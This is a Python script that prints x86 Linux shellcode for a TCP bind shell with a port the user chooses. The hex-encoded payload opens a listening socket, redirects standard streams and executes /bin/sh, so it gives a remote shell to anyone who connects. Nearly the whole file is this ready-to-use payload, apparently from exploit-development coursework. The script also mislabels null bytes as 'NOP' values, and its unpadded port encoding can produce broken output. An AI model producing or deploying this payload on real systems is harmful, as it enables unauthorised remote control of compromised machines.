#!/usr/bin/env python3
import os
import sys
import socket
import binascii
import struct


def validate_port(port):
	try:
		port_ = int(port)
		if port_ < 0 or port_ > 65535:
			print("Invalid Port")
			sys.exit(0)		
	except: 		
		print("Invalid Port")
		sys.exit(0)		


def num_to_hex(port):
	return hex(int(port))[2:]


def to_shellcode(line):
	n = 2
	aux = ["\\x"+line[i:i+n] for i in range(0, len(line), n)]
	shellcode = ''.join(aux)
	return shellcode


def check_nops_shellcode(shellcode):
	if '00' in shellcode.split("\\x"):
		return True
	else:
		return False


def main():
	if len(sys.argv) == 2:
		new_port = sys.argv[1] 
	else:
		new_port = input("Select port:\t")
	validate_port(new_port)
	hex_port = num_to_hex(new_port)
	port_shellcode = to_shellcode(hex_port)
	if check_nops_shellcode(port_shellcode):
		print ("WARNING: That port number causes a NOP value in the shellcode.\n")
	

	new_shellcode = "\\x31\\xc0\\xb0\\x04\\x31\\xdb\\xb3\\x01\\x68\\x2e\\x2e\\x2e\\x0a\\x68\\x70\\x6f\\x72\\x74\\x68\\x69\\x6e\\x67\\x20\\x68\\x42\\x69\\x6e\\x64\\x89\\xe1\\x31\\xd2\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x67\\x01\\xb3\\x02\\x31\\xc9\\xb1\\x01\\x31\\xd2\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x66\\xb8\\x69\\x01\\x31\\xff\\xbf\\x90\\x11\\x11\\x12\\x81\\xef\\x11\\x11\\x11\\x11\\x57\\x66\\x68\\x22\\xb8\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x66\\xcd\\x80\\x66\\xb8\\x6b\\x01\\x31\\xc9\\xcd\\x80\\x66\\xb8\\x6c\\x01\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc3\\xb1\\x03\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf7\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
	new_shellcode = new_shellcode.replace("\\x22\\xb8",port_shellcode)
	print(new_shellcode)


if __name__ == '__main__':
	main()